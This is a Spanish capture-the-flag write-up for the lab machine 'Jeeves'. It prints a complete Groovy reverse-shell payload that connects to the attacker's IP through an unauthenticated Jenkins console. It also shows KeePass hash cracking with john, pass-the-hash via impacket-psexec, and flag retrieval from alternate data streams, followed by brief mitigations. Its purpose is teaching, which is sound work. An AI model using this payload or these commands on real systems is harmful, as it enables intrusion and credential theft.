@@ -1,0 +1,101 @@
+Resumen Ejecutivo:
+
+La máquina Jeeves es un escenario de entrenamiento que simula el compromiso de un servidor de integración continua (CI/CD). El ataque se divide en tres fases críticas:
+
+Acceso Inicial: Identificación de una instancia de Jenkins con la consola de scripts de Groovy expuesta, lo que permitió una Ejecución Remota de Código (RCE).
+
+Movimiento Lateral: Cracking de una base de datos de contraseñas de KeePass (.kdbx) para obtener credenciales administrativas.
+
+Elevación de Privilegios: Uso de técnicas de Pass-The-Hash y recuperación de datos ocultos mediante Alternate Data Streams (ADS) en NTFS.
+
+Fase de Reconocimiento (Enumeración):
+
+El escaneo de puertos reveló múltiples servicios activos.
+
+nmap -sV -sC -Pn -oN nmap/initial 10.129.50.35
+
+Resultados: 
+Puertos 80 (HTTP), 135 (RPC), 445 (SMB) y el puerto inusual 50000/TCP (Jetty).
+
+Descubrimiento: En http://10.129.50.35:50000/askjeeves se localizó un panel de Jenkins.
+
+Acceso Inicial (Explotación):
+
+Jenkins dispone de una consola de scripts en /script que acepta lenguaje Groovy. Al no requerir autenticación, se inyectó un script para obtener un Reverse Shell.
+
+Procedimiento:
+
+Oyente en Kali: nc -lvnp 4444
+
+Payload de Groovy (Sustituyendo por tu IP 10.10.14.211):
+
+Groovy
+
+// Lenguaje: Groovy - Ejecuta un Reverse Shell conectando a la IP del atacante
+String host="10.10.14.211";
+int port=4444;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s=new Socket(host,port);
+InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
+OutputStream po=p.getOutputStream(), so=s.getOutputStream();
+while(!s.isClosed()){
+    while(pi.available()>0)so.write(pi.read());
+    while(pe.available()>0)so.write(pe.read());
+    while(si.available()>0)po.write(si.read());
+    so.flush();
+    po.flush();
+    Thread.sleep(50);
+    try {p.exitValue();break;}
+    catch (Exception e){}
+};
+p.destroy();
+s.close();
+
+Obtención de la User Flag:
+
+Tras recibir la conexión, obtenemos acceso como el usuario kohsuke.
+
+C:\Users\kohsuke\Desktop> type user.txt
+
+Flag: e3232272596fb47950d59c4cf1e7066a
+
+Post-Explotación y Cracking:
+
+Durante la enumeración del sistema de archivos, localizamos CEH.kdbx en los documentos del usuario. Este archivo es un cofre de contraseñas de KeePass.
+
+Procedimiento de Cracking:
+
+Extraer Hash: keepass2john CEH.kdbx > keepass.hash
+
+Ataque de Diccionario: john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
+
+Password Maestro: moonshine1
+
+Elevación de Privilegios (Pass-The-Hash):
+
+Al abrir la base de datos con la clave obtenida, hallamos el Hash NTLM del Administrador: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+
+Técnica Pass-The-Hash (PtH): Utilizamos la suite de Impacket para autenticarnos sin conocer la contraseña en texto plano.
+
+impacket-psexec Administrator@10.129.50.35 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+
+Flag de Root y Alternate Data Streams (ADS)
+
+Como Administrador, la flag no es visible con comandos normales en el escritorio.
+
+Detección: dir /R (Revela flujos ocultos en NTFS).
+
+Extracción:
+
+powershell "Get-Content hm.txt -Stream root.txt"
+
+Root Flag: afbc5bd4b615a60648cec41c6ac92530
+
+Conclusiones y Mitigación:
+
+Jenkins:** Deshabilitar la consola de scripts para usuarios no autenticados.
+
+NTLM: Deshabilitar protocolos de autenticación antiguos para prevenir ataques de Pass-The-Hash.
+
+ADS: Monitorizar el uso de flujos de datos alternativos para detectar persistencia o malware.
